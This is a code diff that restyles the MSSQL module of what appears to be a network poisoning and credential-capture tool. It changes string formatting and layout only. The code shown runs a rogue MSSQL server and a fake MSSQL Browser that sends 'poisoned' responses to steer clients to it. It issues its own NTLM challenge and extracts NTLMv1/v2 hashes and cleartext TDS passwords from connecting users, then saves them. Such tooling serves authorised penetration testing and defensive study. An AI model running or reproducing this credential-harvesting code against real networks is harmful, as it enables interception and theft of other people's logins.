@@ -68,34 +68,38 @@ def ParseSQLHash(data, client, Challenge):
 	DomainLen     = struct.unpack('<H',data[36:38])[0]
 	DomainOffset  = struct.unpack('<H',data[40:42])[0]
 	Domain        = SSPIStart[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
-	
+
 	UserLen       = struct.unpack('<H',data[44:46])[0]
 	UserOffset    = struct.unpack('<H',data[48:50])[0]
 	User          = SSPIStart[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
 
 	if NthashLen == 24:
-		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, codecs.encode(Challenge,'hex').decode('latin-1'))
+		WriteHash = f"{User}::{Domain}:{LMHash}:{NTHash}:{codecs.encode(Challenge, 'hex').decode('latin-1')}"
 
-		SaveToDb({
-			'module': 'MSSQL', 
-			'type': 'NTLMv1', 
-			'client': client, 
-			'user': Domain+'\\'+User, 
-			'hash': LMHash+":"+NTHash, 
-			'fullhash': WriteHash,
-		})
+		SaveToDb(
+			{
+				'module': 'MSSQL',
+				'type': 'NTLMv1',
+				'client': client,
+				'user': Domain + '\\' + User,
+				'hash': f"{LMHash}:{NTHash}",
+				'fullhash': WriteHash,
+			}
+		)
 
 	if NthashLen > 60:
-		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, codecs.encode(Challenge,'hex').decode('latin-1'), NTHash[:32], NTHash[32:])
-		
-		SaveToDb({
-			'module': 'MSSQL', 
-			'type': 'NTLMv2', 
-			'client': client, 
-			'user': Domain+'\\'+User, 
-			'hash': NTHash[:32]+":"+NTHash[32:], 
-			'fullhash': WriteHash,
-		})
+		WriteHash = f"{User}::{Domain}:{codecs.encode(Challenge, 'hex').decode('latin-1')}:{NTHash[:32]}:{NTHash[32:]}"
+
+		SaveToDb(
+			{
+				'module': 'MSSQL',
+				'type': 'NTLMv2',
+				'client': client,
+				'user': Domain + '\\' + User,
+				'hash': f"{NTHash[:32]}:{NTHash[32:]}",
+				'fullhash': WriteHash,
+			}
+		)
 
 
 def ParseSqlClearTxtPwd(Pwd):
@@ -108,20 +112,22 @@ def ParseSqlClearTxtPwd(Pwd):
 
 def ParseClearTextSQLPass(data, client):
 	TDS = TDS_Login_Packet(data)
-	SaveToDb({
-		'module': 'MSSQL', 
-		'type': 'Cleartext', 
-		'client': client,
-		'hostname': "%s (%s)" % (TDS.ServerName, TDS.DatabaseName),
-		'user': TDS.UserName, 
-		'cleartext': ParseSqlClearTxtPwd(TDS.Password), 
-		'fullhash': TDS.UserName +':'+ ParseSqlClearTxtPwd(TDS.Password),
-	})
+	SaveToDb(
+		{
+			'module': 'MSSQL',
+			'type': 'Cleartext',
+			'client': client,
+			'hostname': f"{TDS.ServerName} ({TDS.DatabaseName})",
+			'user': TDS.UserName,
+			'cleartext': ParseSqlClearTxtPwd(TDS.Password),
+			'fullhash': f'{TDS.UserName}:{ParseSqlClearTxtPwd(TDS.Password)}',
+		}
+	)
 
 # MSSQL Server class
 class MSSQL(BaseRequestHandler):
 	def handle(self):
-	
+
 		try:
 			self.ntry = 0
 			while True:
@@ -132,13 +138,17 @@ class MSSQL(BaseRequestHandler):
 				if not data:
 					break
 				if settings.Config.Verbose:
-					print(text("[MSSQL] Received connection from %s" % self.client_address[0].replace("::ffff:","")))
-				if data[0] == b"\x12" or data[0] == 18:  # Pre-Login Message
+					print(
+						text(
+							f'[MSSQL] Received connection from {self.client_address[0].replace("::ffff:", "")}'
+						)
+					)
+				if data[0] in [b"\x12", 18]:  # Pre-Login Message
 					Buffer = str(MSSQLPreLoginAnswer())
 					self.request.send(NetworkSendBufferPython2or3(Buffer))
 					data = self.request.recv(1024)
 
-				if data[0] == b"\x10" or data[0] == 16:  # NegoSSP
+				if data[0] in [b"\x10", 16]:  # NegoSSP
 					if re.search(b'NTLMSSP',data):
 						Packet = MSSQLNTLMChallengeAnswer(ServerChallenge=NetworkRecvBufferPython2or3(Challenge))
 						Packet.calculate()
@@ -148,10 +158,10 @@ class MSSQL(BaseRequestHandler):
 					else:
 						ParseClearTextSQLPass(data,self.client_address[0])
 
-				if data[0] == b'\x11' or data[0] == 17:  # NegoSSP Auth
+				if data[0] in [b'\x11', 17]:  # NegoSSP Auth
 					ParseSQLHash(data,self.client_address[0],Challenge)
 
-		except:
+		except Exception:
 			pass
 
 # MSSQL Server Browser class
@@ -159,7 +169,7 @@ class MSSQL(BaseRequestHandler):
 class MSSQLBrowser(BaseRequestHandler):
 	def handle(self):
 		if settings.Config.Verbose:
-			print(text("[MSSQL-BROWSER] Received request from %s" % self.client_address[0]))
+			print(text(f"[MSSQL-BROWSER] Received request from {self.client_address[0]}"))
 
 		data, soc = self.request
 
@@ -172,13 +182,21 @@ class MSSQLBrowser(BaseRequestHandler):
 				self.send_dac_response(soc)
 
 	def send_response(self, soc, inst):
-		print(text("[MSSQL-BROWSER] Sending poisoned response to %s" % self.client_address[0]))
+		print(
+			text(
+				f"[MSSQL-BROWSER] Sending poisoned response to {self.client_address[0]}"
+			)
+		)
 
 		server_name = ''.join(chr(random.randint(ord('A'), ord('Z'))) for _ in range(random.randint(12, 20)))
-		resp = "ServerName;%s;InstanceName;%s;IsClustered;No;Version;12.00.4100.00;tcp;1433;;" % (server_name, inst)
+		resp = f"ServerName;{server_name};InstanceName;{inst};IsClustered;No;Version;12.00.4100.00;tcp;1433;;"
 		soc.sendto(struct.pack("<BH", 0x05, len(resp)) + NetworkSendBufferPython2or3(resp), self.client_address)
 
 	def send_dac_response(self, soc):
-		print(text("[MSSQL-BROWSER] Sending poisoned DAC response to %s" % self.client_address[0]))
+		print(
+			text(
+				f"[MSSQL-BROWSER] Sending poisoned DAC response to {self.client_address[0]}"
+			)
+		)
 
 		soc.sendto(NetworkSendBufferPython2or3(struct.pack("<BHBH", 0x05, 0x06, 0x01, 1433)), self.client_address)
